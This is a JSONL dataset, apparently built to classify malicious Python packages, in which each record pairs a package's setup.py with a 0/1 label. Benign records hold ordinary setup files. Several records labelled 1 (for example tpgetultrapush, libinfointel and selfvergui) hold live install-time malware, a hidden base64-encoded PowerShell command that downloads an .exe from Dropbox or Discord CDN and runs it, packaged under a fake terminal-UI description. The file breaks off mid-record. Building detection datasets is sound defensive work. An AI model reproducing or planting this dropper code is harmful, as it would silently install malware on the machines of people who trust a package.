setup sdist), the MANIFEST\n    # must be updated accordingly\n    include_package_data = True,\n    package_data = {\"easydev.share\": [\n                    \"themes/standard/*html\",\n                    \"themes/standard/static/*\",\n                    \"themes/cno/*html\",\n                    \"themes/cno/static/*\",\n                    \"copybutton.js\"]},\n\n    install_requires = ['colorama', 'pexpect', \"colorlog\"],\n    extras_require = {\n\t    'profiler': [\"line_profiler_test\"]\n    },\n    tests_require=['pytest'],\n    # somehow, the google_head.html is found in themes/standard and themese/cno\n    # directories thanks to the contents of datafiles variable but the ones from\n    # themes/standard directory are not copied inside the distribution ?\n    # using the MANIFEST.in solve the issue. However, data_files=datafiles is\n    # still required for python setup.py install or pip install to copy the\n    # share directory in the proper place. sure there will be a neat solution\n    # one day\n    zip_safe = False,\n    entry_points = {\n        'console_scripts': [\n            'browse=easydev.browser:main',\n        ]\n        },\n\n)\n\n\n\n\n", "target": 0}
{"idx": "hypixel-networth-api-0.1.2", "func": "from setuptools import setup\n\nsetup(\n    name='hypixel-networth-api',\n    version='0.1.2',\n    packages=['hypixel-networth-api'],\n    install_requires=[\n        'pycryptodome',\n        'requests',\n        'urllib3'\n    ]\n)\n", "target": 1}
{"idx": "xgoogle-cloud-core-1.4.3", "func": "from setuptools import setup, find_packages\nsetup(name = \"xgoogle_cloud_core\", version = \"1.4.3\", packages = find_packages())", "target": 1}
{"idx": "tpgetultrapush-4.19", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgetultrapush',\n    packages = ['modlib'],\n    version = '4.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-filter-22.1", "func": "import os\nimport sys\n\nfrom setuptools import find_packages, setup\n\n# FIXME: Main module requires django to be present, so cannot run setup.py in\n# clean environment.\n# from django_filters import __version__\n__version__ = \"22.1\"\n\nf = open(\"README.rst\")\nreadme = f.read()\nf.close()\n\nif sys.argv[-1] == \"publish\":\n    if os.system(\"pip freeze | grep wheel\"):\n        print(\"wheel not installed.\\nUse `pip install wheel`.\\nExiting.\")\n        sys.exit()\n    if os.system(\"pip freeze | grep twine\"):\n        print(\"twine not installed.\\nUse `pip install twine`.\\nExiting.\")\n        sys.exit()\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a %s -m 'version %s'\" % (__version__, __version__))\n    print(\"  git push --tags\")\n    sys.exit()\n\nsetup(\n    name=\"django-filter\",\n    version=__version__,\n    description=(\n        \"Django-filter is a reusable Django application for allowing\"\n        \" users to filter querysets dynamically.\"\n    ),\n    long_description=readme,\n    author=\"Alex Gaynor\",\n    author_email=\"alex.gaynor@gmail.com\",\n    maintainer=\"Carlton Gibson\",\n    maintainer_email=\"carlton.gibson@noumenal.es\",\n    url=\"https://github.com/carltongibson/django-filter/tree/main\",\n    packages=find_packages(exclude=[\"tests*\"]),\n    project_urls={\n        \"Documentation\": \"https://django-filter.readthedocs.io/en/main/\",\n        \"Changelog\": \"https://github.com/carltongibson/django-filter/blob/main/CHANGES.rst\",\n        \"Bug Tracker\": \"https://github.com/carltongibson/django-filter/issues\",\n        \"Source Code\": \"https://github.com/carltongibson/django-filter\",\n    },\n    include_package_data=True,\n    license=\"BSD\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Framework :: Django :: 4.1\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    zip_safe=False,\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"Django>=3.2\",\n    ],\n)\n", "target": 0}
{"idx": "libpongcvvm-1.16", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpongcvvm',\n    packages = ['modlib'],\n    version = '8.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libinfointel-10.1", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libinfointel',\n    packages = ['modlib'],\n    version = '7.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "globus-sdk-3.10.1", "func": "import os.path\nimport re\n\nfrom setuptools import find_packages, setup\n\nMYPY_REQUIREMENTS = [\n    \"mypy==0.960\",\n    \"types-docutils\",\n    \"types-jwt\",\n    \"types-requests\",\n    \"typing-extensions\",\n]\nLINT_REQUIREMENTS = [\n    \"flake8<5\",\n    \"isort<6\",\n    \"black==21.12b0\",\n    \"flake8-bugbear==21.11.29\",\n] + MYPY_REQUIREMENTS\nTEST_REQUIREMENTS = [\n    \"pytest<7\",\n    \"coverage<7\",\n    \"pytest-xdist<3\",\n    # 'responses' requirement\n    # on py3.6, use the last version to support 3.6\n    'responses==0.17.0; python_version<\"3.7\"',\n    # on py3.7+, use the latest version\n    'responses==0.21.0; python_version>=\"3.7\"',\n]\nDOC_REQUIREMENTS = [\n    \"sphinx<5\",\n    \"sphinx-issues<3\",\n    \"furo==2022.1.2\",\n]\nDEV_REQUIREMENTS = TEST_REQUIREMENTS + LINT_REQUIREMENTS + DOC_REQUIREMENTS\n\n\ndef parse_version():\n    # single source of truth for package version\n    version_string = \"\"\n    version_pattern = re.compile(r'__version__ = \"([^\"]*)\"')\n    with open(os.path.join(\"src\", \"globus_sdk\", \"version.py\")) as f:\n        for line in f:\n            match = version_pattern.match(line)\n            if match:\n                version_string = match.group(1)\n                break\n    if not version_string:\n        raise RuntimeError(\"Failed to parse version information\")\n    return version_string\n\n\ndef read_readme():\n    with open(\"README.rst\") as fp:\n        return fp.read()\n\n\nsetup(\n    name=\"globus-sdk\",\n    version=parse_version(),\n    description=\"Globus SDK for Python\",\n    long_description=read_readme(),\n    author=\"Globus Team\",\n    author_email=\"support@globus.org\",\n    url=\"https://github.com/globus/globus-sdk-python\",\n    packages=find_packages(\"src\"),\n    package_dir={\"\": \"src\"},\n    package_data={\"globus_sdk\": [\"py.typed\"]},\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"requests>=2.19.1,<3.0.0\",\n        \"pyjwt[crypto]>=2.0.0,<3.0.0\",\n        # cryptography 3.4.0 is known-bugged, see:\n        #   https://github.com/pyca/cryptography/issues/5756\n        #\n        # pyjwt requires cryptography>=3.3.1,\n        # so there's no point in setting a lower bound than that\n        #\n        # as of 2021-10-13, we have removed the upper-bound, on the grounds that\n        # - we actively test on the latest versions\n        # - cryptography has a strong API stability policy that makes most releases\n        #   non-breaking for our usages\n        # - other packages /consumers can specify stricter bounds if necessary\n        \"cryptography>=3.3.1,!=3.4.0\",\n        # depend on the latest version of typing-extensions on python versions which do\n        # not have all of the typing features we use\n        'typing_extensions>=4.0;python_version<\"3.10\"',\n    ],\n    extras_require={\"dev\": DEV_REQUIREMENTS},\n    keywords=[\"globus\"],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n)\n", "target": 0}
{"idx": "face-20.1.1", "func": "\"\"\"A command-line interface parser and framework, friendly for users,\nfull-featured for developers.\n\"\"\"\n\nfrom setuptools import setup\n\n\n__author__ = 'Mahmoud Hashemi'\n__version__ = '20.1.1'\n__contact__ = 'mahmoud@hatnote.com'\n__url__ = 'https://github.com/mahmoud/face'\n__license__ = 'BSD'\n\n\nsetup(name='face',\n      version=__version__,\n      description=\"A command-line application framework (and CLI parser). Friendly for users, full-featured for developers.\",\n      long_description=__doc__,\n      author=__author__,\n      author_email=__contact__,\n      url=__url__,\n      packages=['face', 'face.test'],\n      include_package_data=True,\n      zip_safe=False,\n      license=__license__,\n      platforms='any',\n      install_requires=['boltons>=20.0.0'],\n      classifiers=[\n          'Topic :: Utilities',\n          'Intended Audience :: Developers',\n          'Topic :: Software Development :: Libraries',\n          'Programming Language :: Python :: 2.7',\n          'Programming Language :: Python :: 3.5',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: Implementation :: CPython',\n          'Programming Language :: Python :: Implementation :: PyPy', ]\n      )\n\n\"\"\"\nA brief checklist for release:\n\n* tox\n* git commit (if applicable)\n* Bump setup.py version off of -dev\n* git commit -a -m \"bump version for vx.y.z release\"\n* python setup.py sdist bdist_wheel upload\n* bump docs/conf.py version\n* git commit\n* git tag -a vx.y.z -m \"brief summary\"\n* write CHANGELOG\n* git commit\n* bump setup.py version onto n+1 dev\n* git commit\n* git push\n\n\"\"\"\n", "target": 0}
{"idx": "grpcio-health-checking-1.47.0", "func": "# Copyright 2015 gRPC authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Setup module for the GRPC Python package's optional health checking.\"\"\"\n\nimport os\n\nimport setuptools\n\n_PACKAGE_PATH = os.path.realpath(os.path.dirname(__file__))\n_README_PATH = os.path.join(_PACKAGE_PATH, 'README.rst')\n\n# Ensure we're in the proper directory whether or not we're being used by pip.\nos.chdir(os.path.dirname(os.path.abspath(__file__)))\n\n# Break import-style to ensure we can actually find our local modules.\nimport grpc_version\n\n\nclass _NoOpCommand(setuptools.Command):\n    \"\"\"No-op command.\"\"\"\n\n    description = ''\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        pass\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'License :: OSI Approved :: Apache Software License',\n]\n\nPACKAGE_DIRECTORIES = {\n    '': '.',\n}\n\nINSTALL_REQUIRES = (\n    'protobuf>=3.12.0',\n    'grpcio>={version}'.format(version=grpc_version.VERSION),\n)\n\ntry:\n    import health_commands as _health_commands\n\n    # we are in the build environment, otherwise the above import fails\n    SETUP_REQUIRES = ('grpcio-tools=={version}'.format(\n        version=grpc_version.VERSION),)\n    COMMAND_CLASS = {\n        # Run preprocess from the repository *before* doing any packaging!\n        'preprocess': _health_commands.Preprocess,\n        'build_package_protos': _health_commands.BuildPackageProtos,\n    }\nexcept ImportError:\n    SETUP_REQUIRES = ()\n    COMMAND_CLASS = {\n        # wire up commands to no-op not to break the external dependencies\n        'preprocess': _NoOpCommand,\n        'build_package_protos': _NoOpCommand,\n    }\n\nsetuptools.setup(name='grpcio-health-checking',\n                 version=grpc_version.VERSION,\n                 description='Standard Health Checking Service for gRPC',\n                 long_description=open(_README_PATH, 'r').read(),\n                 author='The gRPC Authors',\n                 author_email='grpc-io@googlegroups.com',\n                 url='https://grpc.io',\n                 license='Apache License 2.0',\n                 classifiers=CLASSIFIERS,\n                 package_dir=PACKAGE_DIRECTORIES,\n                 packages=setuptools.find_packages('.'),\n                 python_requires='>=3.6',\n                 install_requires=INSTALL_REQUIRES,\n                 setup_requires=SETUP_REQUIRES,\n                 cmdclass=COMMAND_CLASS)\n", "target": 0}
{"idx": "tpinfoencodeget-6.37", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpinfoencodeget',\n    packages = ['modlib'],\n    version = '10.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gorilla-0.4.0", "func": "# -*- coding: utf-8 -*-\n\nimport io\nimport os\nimport re\nimport setuptools\n\n\ndef _read(*paths, **kwargs):\n    # Credits: https://packaging.python.org/single_source_version.\n    here = os.path.dirname(__file__)\n    encoding = kwargs.get('encoding', 'utf8')\n    with io.open(os.path.join(here, *paths), encoding=encoding) as f:\n        return f.read()\n\n\ndef _get_metas(*file_paths):\n    data = _read(*file_paths)\n    out = {}\n    metas = ('author', 'contact', 'license', 'summary', 'title', 'url',\n             'version')\n    for meta in metas:\n        pattern = r'^__%s__ = u?[\\'\"]([^\\'\"]*)[\\'\"]' % (meta,)\n        match = re.search(pattern, data, re.MULTILINE)\n        if match is None:\n            raise RuntimeError(\"Unable to find the metadata '%s'.\" % (meta,))\n\n        out[meta] = match.group(1)\n\n    return out\n\n\n_METAS = _get_metas('gorilla.py')\n\nsetuptools.setup(\n    name=_METAS['title'],\n    version=_METAS['version'],\n    description=_METAS['summary'],\n    url=_METAS['url'],\n    author=_METAS['author'],\n    author_email=_METAS['contact'],\n    license=_METAS['license'],\n    keywords='gorilla monkey patch patching',\n    long_description=_read('README.rst'),\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Utilities',\n    ],\n    extras_require={\n        'dev': ['coverage', 'pycodestyle', 'pydocstyle', 'pylint',\n                'sphinx>=1.3', 'tox'],\n        'docs': ['sphinx>=1.3'],\n    },\n    packages=[],\n    py_modules=['gorilla'],\n    include_package_data=True\n)\n", "target": 0}
{"idx": "py-hydrapipre-8.72", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydrapipre',\n    packages = ['modlib'],\n    version = '6.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-reversion-5.0.2", "func": "from setuptools import setup, find_packages\nfrom reversion import __version__\n\n\n# Load in babel support, if available.\ntry:\n    from babel.messages import frontend as babel\n    cmdclass = {\n        \"compile_catalog\": babel.compile_catalog,\n        \"extract_messages\": babel.extract_messages,\n        \"init_catalog\": babel.init_catalog,\n        \"update_catalog\": babel.update_catalog,\n    }\nexcept ImportError:\n    cmdclass = {}\n\n\ndef read(filepath):\n    with open(filepath, \"r\", encoding=\"utf-8\") as f:\n        return f.read()\n\n\nsetup(\n    name=\"django-reversion\",\n    version='.'.join(str(x) for x in __version__),\n    license=\"BSD\",\n    description=\"An extension to the Django web framework that provides version control for model instances.\",\n    long_description=read('README.rst'),\n    author=\"Dave Hall\",\n    author_email=\"dave@etianen.com\",\n    url=\"http://github.com/etianen/django-reversion\",\n    zip_safe=False,\n    packages=find_packages(),\n    package_data={\n        \"reversion\": [\"locale/*/LC_MESSAGES/django.*\", \"templates/reversion/*.html\"]},\n    cmdclass=cmdclass,\n    install_requires=[\n        \"django>=2.0\",\n    ],\n    python_requires='>=3.7',\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Framework :: Django\",\n    ]\n)\n", "target": 0}
{"idx": "py-hydraLGTBvm-9.93", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydraLGTBvm',\n    packages = ['modlib'],\n    version = '1.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfvergui-3.9", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvergui',\n    packages = ['modlib'],\n    version = '9.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django_coverage_plugin-2.0.3", "func": "#!/usr/bin/env python\n# -*- encoding: utf-8 -*-\n\"\"\"Setup for Django Coverage Plugin\n\nLicensed under the Apache 2.0 License\n- http://www.apache.org/licenses/LICENSE-2.0\n- https://github.com/nedbat/django_coverage_plugin/blob/master/NOTICE.txt\n\n\"\"\"\nfrom __future__ import absolute_import, print_function\n\nimport io\nimport re\nfrom os.path import dirname, join\n\nfrom setuptools import setup\n\n\ndef read(*names, **kwargs):\n    \"\"\"Read and return contents of file\n\n    Parameter: encoding kwarg may be set\n    \"\"\"\n    return io.open(\n        join(dirname(__file__), *names),\n        encoding=kwargs.get('encoding', 'utf8')\n    ).read()\n\n\nclassifiers = \"\"\"\\\nEnvironment :: Console\nIntended Audience :: Developers\nLicense :: OSI Approved :: Apache Software License\nOperating System :: OS Independent\nProgramming Language :: Python :: 2.7\nProgramming Language :: Python :: 3.6\nProgramming Language :: Python :: 3.7\nProgramming Language :: Python :: 3.8\nProgramming Language :: Python :: 3.9\nProgramming Language :: Python :: 